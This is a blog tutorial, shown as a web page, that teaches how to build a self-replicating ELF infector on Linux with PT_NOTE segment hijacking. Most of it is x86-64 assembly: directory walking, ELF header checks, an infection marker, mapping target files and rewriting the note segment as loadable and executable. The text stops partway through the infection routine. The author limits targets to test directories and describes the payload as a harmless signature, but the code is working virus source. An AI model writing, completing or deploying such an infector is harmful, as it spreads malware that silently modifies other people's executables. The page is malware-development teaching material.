<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>Infectors: how to make a simple self-replicating program on Linux. :: Hacklagr0y</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="Introduction During this post, we will learn how to code a simple ELF infector on Linux. This infector will spread and sel-replicate inside the other binaries that it finds. It will get executed when infected binaries are launched so that it can spread even more. The payload will be harmless, just a signature to attest that the binary has been infected. This infector will be very basic and undisguised at all, any reverse-engineer could see that a file has been infected by executing a simple readelf command (We will get more into that later)." />
<meta name="keywords" content="" />
<meta name="robots" content="noodp" />
<link rel="canonical" href="https://alagroy-42.github.io/malware_dev/infector_basics/" />




<link rel="stylesheet" href="https://alagroy-42.github.io/assets/style.css">

  <link rel="stylesheet" href="https://alagroy-42.github.io/assets/red.css">






<link rel="apple-touch-icon" href="https://alagroy-42.github.io/img/apple-touch-icon-192x192.png">

  <link rel="shortcut icon" href="https://alagroy-42.github.io/img/favicon/red.png">



<meta name="twitter:card" content="summary" />

  
    <meta name="twitter:site" content="" />
  
    <meta name="twitter:creator" content="alagroy-" />



<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Infectors: how to make a simple self-replicating program on Linux.">
<meta property="og:description" content="Introduction During this post, we will learn how to code a simple ELF infector on Linux. This infector will spread and sel-replicate inside the other binaries that it finds. It will get executed when infected binaries are launched so that it can spread even more. The payload will be harmless, just a signature to attest that the binary has been infected. This infector will be very basic and undisguised at all, any reverse-engineer could see that a file has been infected by executing a simple readelf command (We will get more into that later)." />
<meta property="og:url" content="https://alagroy-42.github.io/malware_dev/infector_basics/" />
<meta property="og:site_name" content="Hacklagr0y" />

  
    <meta property="og:image" content="https://alagroy-42.github.io/img/favicon/red.png">
  

<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">


  <meta property="article:published_time" content="2022-06-20 12:11:52 &#43;0200 CEST" />












</head>
<body class="red">


<div class="container center headings--one-size">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="/">
  <div class="logo">
    Home
  </div>
</a>

    </div>
    
      <div class="menu-trigger">menu</div>
    
  </div>
  
    <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="/about">About</a></li>
        
      
        
          <li><a href="/ctfs/">CTFs</a></li>
        
      
        
          <li><a href="/malware">Malware</a></li>
        
      
        
          <li><a href="/tags/">Tags</a></li>
        
      
        
          <li><a href="/writeups">Writeups</a></li>
        
      
      
    

    
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="/about">About</a></li>
      
    
      
        <li><a href="/ctfs/">CTFs</a></li>
      
    
      
        <li><a href="/malware">Malware</a></li>
      
    
      
        <li><a href="/tags/">Tags</a></li>
      
    
      
        <li><a href="/writeups">Writeups</a></li>
      
    
    
  </ul>
</nav>

  
</header>


  <div class="content">
    
<div class="post">
  <h1 class="post-title">
    <a href="https://alagroy-42.github.io/malware_dev/infector_basics/">Infectors: how to make a simple self-replicating program on Linux.</a></h1>
  <div class="post-meta">
    
      <span class="post-date">
        2022-06-20
        
      </span>
    
    
      <span class="post-author">:: alagroy-</span>
    
    
  </div>

  
  <span class="post-tags">
    
    #<a href="https://alagroy-42.github.io/tags/malware/">Malware</a>&nbsp;
    
    #<a href="https://alagroy-42.github.io/tags/virus/">Virus</a>&nbsp;
    
    #<a href="https://alagroy-42.github.io/tags/assembly/">Assembly</a>&nbsp;
    
    #<a href="https://alagroy-42.github.io/tags/linux/">Linux</a>&nbsp;
    
  </span>
  
  


  

  <div class="post-content"><div>
        <h3 id="introduction">Introduction<a href="#introduction" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<p>During this post, we will learn how to code a simple ELF infector on Linux. This infector will spread and sel-replicate inside the other binaries that it finds. It will get executed when infected binaries are launched so that it can spread even more. The payload will be harmless, just a signature to attest that the binary has been infected. This infector will be very basic and undisguised at all, any reverse-engineer could see that a file has been infected by executing a simple <code>readelf</code> command (We will get more into that later).</p>
<p>You can check the full source code <a href="https://github.com/alagroy-42/note_infector">here</a></p>
<h3 id="how-does-it-work-">How does it work ?<a href="#how-does-it-work-" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<p>The technique that we will use here is called PT_NOTE segment hijacking. To understand how it works, we first need to understand the ELF format. The first element of an ELF file is the ELF header, it gives us the info we need to understand and read the rest of the file. Then comes the Program Header table, it will describe how the file is being organized. Each program header describes a part of the file, a part can belong to several program headers. Each entry is described by the following C structure (<code>man elf</code> for more information).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span> <span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> {
</span></span><span style="display:flex;"><span>               <span style="color:#66d9ef">uint32_t</span>   p_type;
</span></span><span style="display:flex;"><span>               <span style="color:#66d9ef">uint32_t</span>   p_flags;
</span></span><span style="display:flex;"><span>               Elf64_Off  p_offset;
</span></span><span style="display:flex;"><span>               Elf64_Addr p_vaddr;
</span></span><span style="display:flex;"><span>               Elf64_Addr p_paddr;
</span></span><span style="display:flex;"><span>               <span style="color:#66d9ef">uint64_t</span>   p_filesz;
</span></span><span style="display:flex;"><span>               <span style="color:#66d9ef">uint64_t</span>   p_memsz;
</span></span><span style="display:flex;"><span>               <span style="color:#66d9ef">uint64_t</span>   p_align;
</span></span><span style="display:flex;"><span>           } Elf64_Phdr;
</span></span></code></pre></div><p>The <code>p_type</code> field describes what kind of program header it is. There are two types that interests us :</p>
<ul>
<li>
<p><code>PT_LOAD: The array element specifies a loadable segment, described by p_filesz and p_memsz. The bytes from the file are mapped to the beginning of the memory segment. If the segment's memory size p_memsz is larger than the file size p_filesz, the &quot;extra&quot; bytes are defined to hold the value 0 and to follow the segment's initialized area. The file size may not be larger than the memory size. Loadable segment entries in the program header table appear in ascending order, sorted on the p_vaddr member.</code></p>
</li>
<li>
<p><code>PT_NOTE: The array element specifies the location of notes (ElfN_Nhdr).</code></p>
</li>
</ul>
<p>The <code>PT_LOAD</code> are being loaded in memory which means that with the right permissions, we can execute the content of it. The <code>PT_NOTE</code> simply gives the location of notes that are useless for the program during its execution. There should be a <code>PT_NOTE</code> segment on every binary compiled the usual way. The technique will consists in changing this <code>PT_NOTE</code> segment to a <code>PT_LOAD</code> pointing to the end of the file where we will put our code. This way, it will be mapped into memory without altering the file too much and we will be able to execute it.</p>
<p>To execute it, we will look a bit more at the ELF header structure defined as</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#define EI_NIDENT 16
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>           <span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> {
</span></span><span style="display:flex;"><span>               <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> e_ident[EI_NIDENT];
</span></span><span style="display:flex;"><span>               <span style="color:#66d9ef">uint16_t</span>      e_type;
</span></span><span style="display:flex;"><span>               <span style="color:#66d9ef">uint16_t</span>      e_machine;
</span></span><span style="display:flex;"><span>               <span style="color:#66d9ef">uint32_t</span>      e_version;
</span></span><span style="display:flex;"><span>               ElfN_Addr     e_entry;
</span></span><span style="display:flex;"><span>               ElfN_Off      e_phoff;
</span></span><span style="display:flex;"><span>               ElfN_Off      e_shoff;
</span></span><span style="display:flex;"><span>               <span style="color:#66d9ef">uint32_t</span>      e_flags;
</span></span><span style="display:flex;"><span>               <span style="color:#66d9ef">uint16_t</span>      e_ehsize;
</span></span><span style="display:flex;"><span>               <span style="color:#66d9ef">uint16_t</span>      e_phentsize;
</span></span><span style="display:flex;"><span>               <span style="color:#66d9ef">uint16_t</span>      e_phnum;
</span></span><span style="display:flex;"><span>               <span style="color:#66d9ef">uint16_t</span>      e_shentsize;
</span></span><span style="display:flex;"><span>               <span style="color:#66d9ef">uint16_t</span>      e_shnum;
</span></span><span style="display:flex;"><span>               <span style="color:#66d9ef">uint16_t</span>      e_shstrndx;
</span></span><span style="display:flex;"><span>           } ElfN_Ehdr;
</span></span></code></pre></div><p>The field that interests us here is <code>e_entry</code> which will define the entrypoint of our program. If we put our code, the program will execute it and we will just have to transfer the execution back to the original entrypoint so that the program can keep its course.</p>
<h3 id="the-code">The code<a href="#the-code" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<h4 id="filesystem-reading">Filesystem reading<a href="#filesystem-reading" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p>The first thing to do will be finding files to infect. For safety reason and because we don&rsquo;t want to launch our program as root, we will not look for those in <code>/bin</code> or <code>/usr/bin</code> but in <code>/tmp/test</code> and <code>/tmp/test2</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-nasm" data-lang="nasm"><span style="display:flex;"><span>_start:
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">push</span>    rbp
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     rbp, rsp
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sub</span>     rsp, <span style="color:#ae81ff">0x10</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">lea</span>     rdi, [rel cwd]
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     rsi, O_DIRECTORY <span style="color:#f92672">|</span> O_RDONLY
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">xor</span>     eax, eax
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">add</span>     al, SYS_OPEN
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">syscall</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     [rsp], eax      <span style="color:#75715e">; We open and save the fd of the cwd so that we will be able</span>
</span></span><span style="display:flex;"><span>                            <span style="color:#75715e">; to chdir back to it after we are don</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">lea</span>     rdi, [rel dir1] <span style="color:#75715e">; /tmp/test</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">call</span>    readdir
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">lea</span>     rdi, [rel dir2] <span style="color:#75715e">; /tmp/test2</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">call</span>    readdir
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     edi, [rsp]
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">xor</span>     eax, eax
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">add</span>     al, SYS_FCHDIR
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">syscall</span>                 <span style="color:#75715e">; Back to our initial cwd to not break the executed binary (eg. ls)</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     edi, [rsp]
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">xor</span>     eax, eax
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">add</span>     eax, SYS_CLOSE
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">syscall</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">leave</span>
</span></span></code></pre></div><p>This code chunk will allow us to call the <code>readdir</code> function that we will use to run through files in both of the target directories. To use those files then, we want to open them with relative paths to avoid string operations that are a bit painful in ASM so we will use <code>chdir</code> to open them directly. Our first step to avoid breaking the infected program (eg <code>ls</code>) will be to open our current working directory to be able to get back to it once the job is done.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-nasm" data-lang="nasm"><span style="display:flex;"><span>readdir:
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">push</span>    rbp
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     rbp, rsp
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sub</span>     rsp, <span style="color:#ae81ff">0x20</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     eax, SYS_CHDIR  <span style="color:#75715e">; Let&#39;s change the directory to open file,</span>
</span></span><span style="display:flex;"><span>                            <span style="color:#75715e">; string operations are painful in ASM so relative paths will do</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">syscall</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     rsi, O_DIRECTORY <span style="color:#f92672">|</span> O_RDONLY
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">xor</span>     eax, eax
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">add</span>     eax, SYS_OPEN
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">syscall</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     [rsp], eax
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">xor</span>     rdi, rdi
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     rsi, <span style="color:#ae81ff">0x1000</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">add</span>     rdx, PROT_READ <span style="color:#f92672">|</span> PROT_WRITE
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     r10, MAP_ANONYMOUS <span style="color:#f92672">|</span> MAP_PRIVATE
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">xor</span>     r8, r8
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">dec</span>     r8
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">xor</span>     r9, r9
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">xor</span>     eax, eax
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">add</span>     al, SYS_MMAP
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">syscall</span>                 <span style="color:#75715e">; We map a page for the getdents buffer</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">test</span>    al, al
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">jnz</span>     end_readdir
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     [rsp <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span>], rax
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>loop_dir:
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     edi, [rsp]
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     rsi, [rsp <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     rdx, DIRENT_MAX_SIZE
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">xor</span>     eax, eax
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">add</span>     al, SYS_GETDENTS64
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">syscall</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">cmp</span>     eax, <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">jle</span>     end_readdir
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     [rsp <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x4</span>], eax
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">xor</span>     r8, r8
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>loop_buf_dirent:
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     [rsp <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>], r8w
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     r9, [rsp <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">cmp</span>     <span style="color:#66d9ef">BYTE</span> [r9 <span style="color:#f92672">+</span> r8 <span style="color:#f92672">+</span> d_type], DT_REG
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">jne</span>     next_dirent
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">lea</span>     rdi, [r9 <span style="color:#f92672">+</span> r8 <span style="color:#f92672">+</span> d_name]
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">call</span>    infect          <span style="color:#75715e">; We only infect regular files </span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>next_dirent:
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     r9, [rsp <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">movzx</span>   r8, <span style="color:#66d9ef">WORD</span> [rsp <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">add</span>     r8w, [r9 <span style="color:#f92672">+</span> r8 <span style="color:#f92672">+</span> d_reclen]
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">cmp</span>     r8w, [rsp <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">jl</span>      loop_buf_dirent
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">jmp</span>     loop_dir
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>end_readdir:
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     edi, [rsp]
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">xor</span>     eax, eax
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">add</span>     eax, SYS_CLOSE
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">syscall</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     rdi, [rsp <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     rsi, <span style="color:#ae81ff">0x1000</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     eax, SYS_MUNMAP
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">syscall</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">leave</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ret</span>
</span></span></code></pre></div><p>With the <code>readdir</code> function, we will loop through all the <code>linux_dirent64</code> structures present in each of the target directories. If the current structure describes a regular file, we will call the <code>infect</code> function with its name as argument to try to infect it.</p>
<h4 id="preliminary-checks">Preliminary checks<a href="#preliminary-checks" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p>The <code>infect</code> function will be the main function of our program. To make the code more clean, I&rsquo;ve defined a structure called <code>Infection_struct</code> in <code>defines.s</code> that will allow me, by considering the stack frame as this structure to use its fields as local variable names.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-nasm" data-lang="nasm"><span style="display:flex;"><span>infect:
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">push</span>    rbp
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     rbp, rsp
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sub</span>     rsp, INFECTOR_STRUCT_SIZE
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     esi, O_RDWR
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     eax, SYS_OPEN
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">syscall</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">cmp</span>     eax, <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">jl</span>      quit_infect
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     [rsp <span style="color:#f92672">+</span> inf_fd], eax
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     edi, [rsp <span style="color:#f92672">+</span> inf_fd]
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">lea</span>     rsi, [rsp <span style="color:#f92672">+</span> inf_elfhdr]
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     rdx, ELFHDR_SIZE
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     eax, SYS_READ
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">syscall</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">lea</span>     rbx, [rsp <span style="color:#f92672">+</span> inf_elfhdr]
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">lea</span>     rax, [rbx <span style="color:#f92672">+</span> e_ident]
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">cmp</span>     [rax], <span style="color:#66d9ef">DWORD</span> ELF_MAGIC
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">jne</span>     close_quit_infect
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">cmp</span>     [rax <span style="color:#f92672">+</span> EI_CLASS], <span style="color:#66d9ef">BYTE</span> ELFCLASS64
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">jne</span>     close_quit_infect
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">cmp</span>     [rax <span style="color:#f92672">+</span> EI_DATA], <span style="color:#66d9ef">BYTE</span> ELFDATA2LSB       <span style="color:#75715e">; Only ELF 64 bits are being taken into account</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">jne</span>     close_quit_infect
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">cmp</span>     [rax <span style="color:#f92672">+</span> EI_PAD], <span style="color:#66d9ef">DWORD</span> INFECTION_MAGIC   <span style="color:#75715e">; We check them to avoid double infection</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">je</span>      close_quit_infect
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     rdx, [rax <span style="color:#f92672">+</span> e_phnum]
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">test</span>    rdx, rdx
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">je</span>      close_quit_infect
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     ax, [rbx <span style="color:#f92672">+</span> e_type]
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">cmp</span>     ax, ET_EXEC
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">je</span>      right_type_check
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">cmp</span>     ax, ET_DYN
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">jne</span>     close_quit_infect
</span></span></code></pre></div><p>The first part of this function is just about parsing the ELF header to check for several things:</p>
<ul>
<li>The file is a valid ELF file</li>
<li>It is either an executable file or a shared object file</li>
<li>It has not been infected yet</li>
</ul>
<p>Since it is useless and memory-consuming to reinfect a file, we will prevent that to append. In the <code>e_ident</code> field of the ELF header, there are some padding bytes that are unused and zero-filled. We will put an infection marker here to keep track of the already infected binaries.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-nasm" data-lang="nasm"><span style="display:flex;"><span>right_type_check:
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     edi, [rsp <span style="color:#f92672">+</span> inf_fd]
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">xor</span>     rsi, rsi
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     rdx, SEEK_END
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     eax, SYS_LSEEK
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">syscall</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     [rsp <span style="color:#f92672">+</span> inf_filesize], rax
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     rsi, rax
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">xor</span>     rdi, rdi
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     rdx, PROT_READ <span style="color:#f92672">|</span> PROT_WRITE
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     r10, MAP_SHARED
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     r8d, [rsp <span style="color:#f92672">+</span> inf_fd]
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">xor</span>     r9, r9
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     eax, SYS_MMAP
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">syscall</span>                     <span style="color:#75715e">; We map the file into memory to operate on it</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">test</span>    al, al
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">jnz</span>     close_quit_infect
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     [rsp <span style="color:#f92672">+</span> inf_map], rax
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     [rax <span style="color:#f92672">+</span> e_ident <span style="color:#f92672">+</span> EI_PAD], <span style="color:#66d9ef">DWORD</span> INFECTION_MAGIC <span style="color:#75715e">; Mark binary for infection</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     <span style="color:#66d9ef">QWORD</span> [rsp <span style="color:#f92672">+</span> inf_notehdr], <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     r8, rax
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">add</span>     r8, [rax <span style="color:#f92672">+</span> e_phoff]
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">movzx</span>   rcx, <span style="color:#66d9ef">WORD</span> [rax <span style="color:#f92672">+</span> e_phnum]
</span></span><span style="display:flex;"><span>loop_phdrs:
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">cmp</span>     [r8 <span style="color:#f92672">+</span> p_type], <span style="color:#66d9ef">DWORD</span> PT_NOTE
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">jne</span>     cmp_load_phdr
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     <span style="color:#66d9ef">QWORD</span> [rsp <span style="color:#f92672">+</span> inf_notehdr], r8
</span></span><span style="display:flex;"><span>cmp_load_phdr:
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">cmp</span>     [r8 <span style="color:#f92672">+</span> p_type], <span style="color:#66d9ef">DWORD</span> PT_LOAD
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">jne</span>     next_phdr
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     <span style="color:#66d9ef">QWORD</span> [rsp <span style="color:#f92672">+</span> inf_last_pt_load], r8
</span></span><span style="display:flex;"><span>next_phdr:
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">add</span>     r8w, [rax <span style="color:#f92672">+</span> e_phentsize]
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">loop</span>    loop_phdrs
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>check_if_note_exists:
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     rax, [rsp <span style="color:#f92672">+</span> inf_notehdr]
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">test</span>    rax, rax
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">jz</span>      munmap_quit_infect
</span></span></code></pre></div><p>This next code chunk is gonna map the file into memory and get some information that are gonna be useful for the infection routine such as:</p>
<ul>
<li>the file size</li>
<li>the <code>PT_NOTE</code> phdr address</li>
<li>the last <code>PT_LOAD</code> phdr address</li>
</ul>
<h4 id="infection">Infection<a href="#infection" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p>Once we have every needed information, we can get to the serious part.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-nasm" data-lang="nasm"><span style="display:flex;"><span>patch_note_phdr:
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     rax, [rsp <span style="color:#f92672">+</span> inf_notehdr]
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     [rax <span style="color:#f92672">+</span> p_type], <span style="color:#66d9ef">DWORD</span> PT_LOAD       <span style="color:#75715e">; We make it loadable</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     [rax <span style="color:#f92672">+</span> p_flags], <span style="color:#66d9ef">DWORD</span> PF_R <span style="color:#f92672">|</span> PF_X  <span style="color:#75715e">; And executable</span>
